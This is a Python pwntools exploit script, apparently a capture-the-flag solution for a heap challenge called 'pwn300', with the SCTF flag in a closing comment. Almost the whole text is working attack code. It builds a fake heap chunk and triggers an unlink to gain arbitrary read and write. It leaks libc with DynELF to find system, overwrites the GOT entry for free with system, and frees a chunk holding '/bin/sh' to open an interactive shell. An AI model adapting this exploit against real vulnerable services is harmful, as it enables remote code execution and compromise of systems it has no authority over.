from pwn import *

context(log_level="debug")
buf = 0x08049D80
elf = ELF('pwn300')
free = elf.got['free']

def setchunk(size):
	p.recvuntil('5. Exit\n')
	p.sendline('1')
	p.recvuntil(' want :')
	p.sendline(str(size))

def edit(index,content):
	p.recvuntil('5. Exit\n')
	p.sendline('3')
	p.recvuntil('s num:')
	p.sendline(str(index))
	p.recvuntil('content:')
	p.sendline(content)
def show(index):
	p.recvuntil('5. Exit\n')
	p.sendline('2')
	p.recvuntil('s num:')
	p.sendline(str(index))
	return p.recvline()
def dele(index):
	p.recvuntil('5. Exit\n')
	p.sendline('4')
	p.recvuntil('s num:')
	p.sendline(str(index))
def leak(addr):
	payload = 'A'*0xc+p32(buf-0xc)+p32(addr)
	edit(0,payload)
	data = show(1)[0:4]
	print "%#x => %s" % (addr, (data or '').encode('hex'))
	return data
# p = process('./pwn300')
p = remote('127.0.0.1',55554)
## we should create some chunck

setchunk(0x80)
setchunk(0x80)
setchunk(0x80)# because of 0x0a so hava to sava in chunck3
setchunk(0x80)# /bin/sh
edit(3,'/bin/sh')
## fake chunk0
payload1 = p32(0)+p32(0x89)+p32(buf-0xc)+p32(buf-0x8)+'A'*(0x80-4*4)+p32(0x80)+p32(0x88)#size is the length of chunck
edit(0,payload1)
# gdb.attach(pidof(p)[0])
dele(1) # the addr of chunk0 had been changed
## change the addr of chunk1
# payload2 = 'A'*0xc+p32(buf-0xc)+p32(free)
# edit(0,payload2)
# libc_free = u32(show(1)[0:4])
# print 'libc_free=' + hex(libc_free)
#gdb.attach(pidof(p)[0])
d = DynELF(leak, elf=ELF('./pwn300'))
system_addr = d.lookup('system','libc')
print 'system_addr ='+hex(system_addr)
###edit free to system
payload2 =  'A'*0xc+p32(buf-0xc)+p32(free)
edit(0,payload2)
edit(1,p32(system_addr))
### getshell
dele(3)
p.interactive()

##SCTF{Have_Fun_WITH_unlink}